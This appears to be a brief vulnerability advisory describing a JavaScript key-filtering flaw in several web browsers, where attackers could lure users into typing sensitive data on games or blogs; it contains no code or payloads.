Multiple web browsers are prone to a JavaScript key-filtering vulnerability because the browsers fail to securely handle keystroke input from users.

Exploiting this issue requires that users manually type sensitive data. This may require substantial typing from targeted users, so attackers will likely use keyboard-based games, blogs, or other similar pages to entice users to enter the required keyboard input.
